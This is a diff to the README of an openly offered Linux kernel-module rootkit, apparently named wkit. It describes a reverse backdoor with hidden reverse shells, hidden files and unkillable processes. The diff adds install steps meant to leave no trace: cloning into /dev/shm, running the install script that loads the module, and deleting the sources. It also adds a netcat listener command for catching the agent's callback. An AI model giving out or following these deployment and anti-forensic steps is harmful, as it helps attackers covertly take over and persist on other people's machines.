@@ -5,7 +5,7 @@
   wkit | a rootkit for modern kernels
 </h1>
 
-a linux loadable kernel module rootkit for modern kernels
+a linux loadable kernel module (LKM) rootkit for modern kernels
 using a userland agent, it provides a reverse backdoor that 
 you can use to create hidden reverse shells, hidding files and
 protecting processes.
@@ -17,14 +17,18 @@ protecting processes.
 - make processes hidden and unkillable
 
 ## installing
-clone the repository, to leave no trace on the disk
+first you should install all the dependencies:
+- `build-essential`: gcc and other compile tools 
+- `linux-headers`: linux API headers needed for building a LKM 
+
+then clone the repository, to leave no trace on the disk
 you can do this inside the `/dev/shm` directory:
 ```bash
 cd /dev/shm
 git clone https://github.com/ngn13/wkit.git
 cd wkit
 ```
-then run the `install.sh` script:
+after that run the `install.sh` script:
 ```bash
 ./install.sh
 ```
@@ -32,14 +36,24 @@ this script will:
 - check the kernel version and arch
 - create new random configuration 
 - build the kernel module
-- build the userland binary
-- install the userland binary 
+- build the userland agent 
+- install the userland agent 
 - load the kernel module
 
-then cleanup the sources:
+lastly cleanup the sources:
 ```
 cd .. && rm -rf wkit
 ```
+
+## usage
+start a netcat listener on the host and port you specified during
+the installation:
+```
+nc -lnvp <port>
+```
+userland agent attempts to make connection with this address every 
+5 seconds, so you should receive a backdoor connection in few seconds
+
 
 ## resources
 to learn more about LKMs and rootkits checkout these resources:
